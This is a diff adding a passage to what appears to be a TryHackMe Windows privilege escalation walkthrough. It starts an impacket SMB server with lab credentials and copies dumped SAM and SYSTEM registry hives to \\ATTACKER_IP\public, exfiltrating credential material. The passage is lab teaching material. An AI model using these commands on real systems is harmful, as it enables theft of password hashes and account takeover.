@@ -120,3 +120,9 @@ mkdir share
 python3.9 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share
 ```
 
+This will create a share named public pointing to the share directory, which requires the username and password of our current windows session. After this, we can use the copy command in our windows machine to transfer both files to our AttackBox
+
+```JavaScript
+C:\> copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\
+C:\> copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\
+```
